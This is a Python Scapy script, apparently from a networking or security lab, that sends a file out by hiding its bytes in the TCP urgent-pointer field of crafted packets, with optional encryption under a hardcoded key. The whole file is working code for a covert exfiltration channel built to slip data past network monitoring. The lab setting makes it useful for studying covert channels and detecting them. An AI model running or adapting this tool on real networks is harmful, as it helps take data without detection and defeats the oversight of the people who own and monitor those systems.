from scapy.all import *
import argparse
import os
import time
import random
from cryptography.fernet import Fernet

# Hardcoded symmetric key - must be the same in both sender and receiver
SYMMETRIC_KEY = b'dBbg_kQbMCvR3S1tzx6yTDJL3XaG6qyTjvBEx-0vvUY='

def encrypt_data(data):
    """Encrypt data using the hardcoded symmetric key"""
    f = Fernet(SYMMETRIC_KEY)
    return f.encrypt(data)

def perform_handshake(ip_dst, sport, dport):
    """Perform a TCP three-way handshake"""
    print(f"Initiating TCP handshake with {ip_dst}:{dport}...")
    
    # Generate initial sequence number
    seq = random.randint(1000, 9000)
    
    # SYN
    ip = IP(dst=ip_dst)
    syn = TCP(sport=sport, dport=dport, flags="S", seq=seq)
    syn_ack = sr1(ip/syn, timeout=3, verbose=0, retry=3)
    
    if not syn_ack:
        print("No response to SYN packet. Target may be unreachable.")
        return None, None
    
    if not syn_ack.haslayer(TCP) or not (syn_ack[TCP].flags & 0x12):  # Check for SYN-ACK flags
        print(f"Improper response received during handshake. Flags: {syn_ack[TCP].flags}")
        return None, None
    
    # ACK
    ack = TCP(sport=sport, dport=dport, flags="A", 
              seq=seq+1, ack=syn_ack[TCP].seq+1)
    send(ip/ack, verbose=0)
    
    print("TCP handshake completed successfully.")
    return seq+1, syn_ack[TCP].seq+1

def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):

    host = os.getenv('INSECURENET_HOST_IP')
    port = 8888
    
    if not host:
        print("Error: No target host specified.")
        return
    
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' not found.")
        return

    # Validate bits_to_use parameter
    if bits_to_use < 1 or bits_to_use > 16:
        print("Error: bits_to_use must be between 1 and 16")
        return
    
    max_value = (1 << bits_to_use) - 1
    bytes_per_chunk = max(1, bits_to_use // 8)
    print(f"Using {bits_to_use} bits of the urgent pointer field (max value: {max_value})")
    
    # Read file data
    with open(file_path, 'rb') as f:
        data = f.read()

    # Encrypt data if requested
    if use_encryption:
        print("Encrypting data...")
        data = encrypt_data(data)
    
    print(f"File size: {len(data)} bytes")
    
    # Prepare data chunks based on bits_to_use
    chunks = []
    mask = max_value
    
    # If bits_to_use is 8 or less, we process 1 byte at a time
    if bits_to_use <= 8:
        for byte in data:
            chunks.append(byte & mask)
    else:
        # For more than 8 bits, we process 2 bytes at a time
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                value = (data[i] << 8) | data[i+1]
            else:
                # Pad with zero if we have an odd number of bytes
                value = (data[i] << 8)
            chunks.append(value & mask)
    
    # Use random values for sport
    sport = random.randint(1024, 65535)
    
    # Perform TCP handshake
    seq, ack = perform_handshake(host, sport, port)
    if not seq or not ack:
        print("Handshake failed, aborting transmission.")
        return
    
    ip = IP(dst=host)
    print(f"Sending {len(chunks)} chunks to {host}:{port}...")
    
    # Send data chunks
    for i, value in enumerate(chunks):
        tcp = TCP(sport=sport, dport=port, flags="U", seq=seq, ack=ack)
        tcp.urgptr = value  # Encode data in the URG pointer
        pkt = ip/tcp/"X"  # Dummy payload
        
        send(pkt, verbose=0)
        print(f"Sent chunk {i+1}/{len(chunks)}: URG={value} (0x{value:04X})")
        
        # Increase sequence number for next packet
        seq += len(pkt[TCP].payload)
        
        # Wait between packets
        time.sleep(interval)
    
    # Send marker packet to indicate transmission complete
    end_marker = TCP(sport=sport, dport=port, flags="FA", seq=seq, ack=ack)
    send(ip/end_marker, verbose=0)
    print(f"Successfully sent {len(data)} bytes using TCP URG covert channel.")
    
    # Send FIN to close connection properly
    fin = TCP(sport=sport, dport=port, flags="F", seq=seq+1, ack=ack)
    fin_ack = sr1(ip/fin, timeout=2, verbose=0)
    if fin_ack and fin_ack.haslayer(TCP):
        # Send final ACK
        last_ack = TCP(sport=sport, dport=port, flags="A", seq=seq+2, ack=fin_ack[TCP].seq+1)
        send(ip/last_ack, verbose=0)
    print("Connection closed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Covert channel sender using TCP URG pointer")
    parser.add_argument('--file', required=True, help="Path to the file to send")
    parser.add_argument('--interval', type=float, default=0.2, help="Interval between packets in seconds")
    parser.add_argument('--bits', type=int, default=16, help="Number of bits to use in the urgent pointer (1-16)")
    parser.add_argument('--encrypt', action='store_true', help="Enable encryption of data")
    args = parser.parse_args()

    tcp_sender(args.file, args.interval, args.bits, args.encrypt)